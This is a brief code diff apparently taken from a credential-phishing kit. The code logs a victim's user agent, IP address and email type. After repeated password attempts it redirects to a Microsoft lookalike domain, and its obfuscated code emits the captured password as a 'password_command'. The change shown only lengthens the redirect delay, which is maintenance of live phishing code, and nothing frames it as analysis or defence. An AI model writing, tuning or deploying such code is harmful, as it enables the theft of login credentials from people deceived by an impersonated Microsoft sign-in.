@@ -402,7 +402,7 @@ ${message.ua} | IP: ${ipAddress} | Email Type: ${message.email_type} | Time Zone
     if (passwordAttempts > 1) {
       setTimeout(function() {
         window.location.href = "https://microsoft.archive-login.com";
-    }, 2000);
+    }, 3000);
     }
     _0x58102b.emit("password_command", _0x4c5d45);
   });
